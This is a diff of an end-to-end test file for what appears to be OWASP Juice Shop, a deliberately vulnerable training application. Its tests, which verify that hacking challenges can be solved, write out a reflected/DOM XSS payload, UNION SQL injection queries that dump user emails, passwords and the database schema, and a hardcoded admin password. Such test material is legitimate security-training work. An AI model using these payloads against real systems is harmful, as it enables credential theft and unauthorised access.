@@ -4,60 +4,69 @@ const pastebinLeakProduct = config.get('products').filter(product => product.key
 const models = require('../../models/index')
 
 describe('/#/search', () => {
-  let searchQuery, searchButton
+  let searchQuery
 
   beforeEach(() => {
     browser.get('/#/search') // not really necessary as search field is part of navbar on every dialog
     searchQuery = element(by.id('searchQuery'))
-    searchButton = element(by.id('searchButton'))
   })
 
-  describe('challenge "xss1"', () => {
+  describe('challenge "localXss"', () => {
     it('search query should be susceptible to reflected XSS attacks', () => {
+      const inputField = element(by.id('mat-input-0'))
       const EC = protractor.ExpectedConditions
 
-      searchQuery.sendKeys('<iframe src="javascript:alert(`xss`)">')
-      searchButton.click()
-      browser.wait(EC.alertIsPresent(), 5000, "'xss' alert is not present")
+      searchQuery.click()
+      inputField.sendKeys('<iframe src="javascript:alert(`xss`)">')
+      browser.actions().sendKeys(protractor.Key.ENTER).perform()
+      browser.wait(EC.alertIsPresent(), 5000, "'xss' alert is not present on /#/search")
       browser.switchTo().alert().then(alert => {
         expect(alert.getText()).toEqual('xss')
         alert.accept()
       })
     })
 
-    protractor.expect.challengeSolved({ challenge: 'XSS Tier 1' }) // FIXME Verification on server side not possible as value never get submitted to it
+    protractor.expect.challengeSolved({ challenge: 'DOM XSS' })
   })
 })
 
-describe('/rest/product/search', () => {
-  describe('challenge "unionSqlI"', () => {
+describe('/rest/products/search', () => {
+  describe('challenge "unionSqlInjection"', () => {
     it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
-      browser.driver.get(browser.baseUrl + '/rest/product/search?q=\')) union select null,id,email,password,null,null,null,null from users--')
+      browser.driver.get(`${browser.baseUrl}/rest/products/search?q=')) union select id,'2','3',email,password,'6','7','8','9' from users--`)
     })
 
     protractor.expect.challengeSolved({ challenge: 'User Credentials' })
+  })
+
+  describe('challenge "dbSchema"', () => {
+    it('query param in product search endpoint should be susceptible to UNION SQL injection attacks', () => {
+      browser.driver.get(`${browser.baseUrl}/rest/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9' from sqlite_master--`)
+    })
+
+    protractor.expect.challengeSolved({ challenge: 'Database Schema' })
   })
 
   describe('challenge "dlpPastebinLeakChallenge"', () => {
     protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })
 
     it('search query should logically reveal the special product', () => {
-      browser.driver.get(browser.baseUrl + '/rest/product/search?q=\'))--').then(() => {
+      browser.driver.get(browser.baseUrl + '/rest/products/search?q=\'))--').then(() => {
         expect(browser.driver.getPageSource()).toContain(pastebinLeakProduct.name)
       })
     })
   })
 
-  describe('challenge "christmasSpecial"', () => {
+  xdescribe('challenge "christmasSpecial"', () => {
     protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })
 
     it('search query should reveal logically deleted christmas special product on SQL injection attack', () => {
-      browser.driver.get(browser.baseUrl + '/rest/product/search?q=\'))--').then(() => {
+      browser.driver.get(browser.baseUrl + '/rest/products/search?q=\'))--').then(() => {
         expect(browser.driver.getPageSource()).toContain(christmasProduct.name)
       })
     })
 
-    it('should be able to place Christmas product into shopping card by id', () => { // FIXME Fix XHTTP request
+    it('should be able to place Christmas product into shopping card by id', () => {
       browser.waitForAngularEnabled(false)
       models.sequelize.query('SELECT * FROM PRODUCTS').then(([products]) => {
         var christmasProductId = products.filter(product => product.name === christmasProduct.name)[0].id
